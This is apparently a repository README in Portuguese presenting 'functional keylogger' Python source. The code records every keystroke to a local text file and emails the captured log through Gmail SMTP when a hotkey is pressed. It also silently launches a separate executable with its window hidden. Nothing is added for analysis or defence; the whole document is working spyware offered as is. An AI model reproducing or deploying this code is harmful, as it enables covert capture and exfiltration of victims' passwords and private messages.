# script-keylogger
script funcional de keylogger 


///////////////////// COdigo fonte///////////////////////////////

import smtplib 
from email.mime.text import MIMEText
from email.message import EmailMessage
import re
import keyboard
import os
import base64
from pathlib import Path
import subprocess
import threading
import sys

subprocess.Popen(
     [r"C:\Users\Micro\Desktop\executavel\dist\exec.exe"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    creationflags=subprocess.CREATE_NO_WINDOW,
)

def enviar_email():
    
    with open('arquivo.txt', 'r', encoding='latin-1') as f:
        corpo_email = f.read()
    msg = EmailMessage()
    msg['Subject'] = 'Meu nome é dork'
    msg['From'] = ''
    msg['To'] =  ''
    msg.set_content(corpo_email)

    password = ''

    # conexão segura

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(msg['From'], password)
    s.sendmail(msg['From'], msg['To'], msg.as_string())
    s.quit

with open('arquivo.txt', 'w') as f:
    f.write("")

data_path = 'arquivo.txt'

def registro(event):
    with open(data_path, "a") as f:
        f.write(event.name + " ")

keyboard.hook(registro)
keyboard.press_and_release('space')

def executar_hotkey():
    print("\n--- Hotkey 'a' ativada")
    enviar_email()

keyboard.add_hotkey('a', executar_hotkey)

print(f"O arquivo está em {data_path}")

keyboard.wait()
